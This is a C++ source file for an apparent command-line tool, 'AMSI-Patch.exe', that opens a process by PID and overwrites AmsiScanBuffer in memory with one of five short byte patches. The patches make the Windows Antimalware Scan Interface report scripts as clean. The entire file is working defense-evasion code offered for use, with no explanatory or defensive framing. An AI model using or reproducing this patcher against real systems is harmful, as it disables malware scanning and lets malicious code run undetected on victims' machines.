#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ntdll")
using namespace std;


typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);


void patchAMSI(HANDLE& hProc, int PatchNbr) {

    void* AMSIaddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    
    char amsiPatch[100];
    
    switch (PatchNbr) {
        case 1:
            /*
                0:  31 c0                   xor    eax,eax
                2:  05 4e fe fd 7d          add    eax,0x7dfdfe4e
                7:  05 09 02 09 02          add    eax,0x2090209
                c:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x31\xC0\x05\x4E\xFE\xFD\x7D\x05\x09\x02\x09\x02\xC3");
            break;
        
        case 2:
            /*
                0:  b8 57 00 07 80          mov    eax,0x80070057
                5:  c3                      ret
            */
            lstrcatA(amsiPatch, "\xB8\x57\x00\x07\x80\xC3");
            break;
        
        case 3:
            /*
                0:  31 c0                   xor    eax,eax
                2:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x31\xC0\xC3");
            break;
        
        case 4:
            /*
                0:  48 c7 c0 00 00 00 00    mov    rax,0x0
                7:  c3                      ret
            */
            lstrcatA(amsiPatch, "\x48\xC7\xC0\x00\x00\x00\x00\xC3");
            break;
        
        case 5:
        default:
            /*
                0:  c3                      ret
            */
            lstrcatA(amsiPatch, "\xC3");
            break;
        

    }

    DWORD OldProtect = 0;
    SIZE_T memPage = 0x1000;
    void* ptrAMSIaddr = AMSIaddr;

    

    NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
    NtWriteVirtualMemory(hProc, (LPVOID)AMSIaddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
    NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
    std::cout << "\n\n[+] AmsiScanBuffer is Patched!\n\n";
}



int main(int argc, char** argv) {

    HANDLE hProc;

    if (argc < 3) {
        printf("USAGE: AMSI-Patch.exe <PID> <PatchNbr (from 1-5)>\n");
        return 1;
    }
    
    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
    if (!hProc) {
        printf("Failed in OpenProcess (%u)\n", GetLastError());
        return 2;
    }

    patchAMSI(hProc, atoi(argv[2])); 
    

    return 0;

}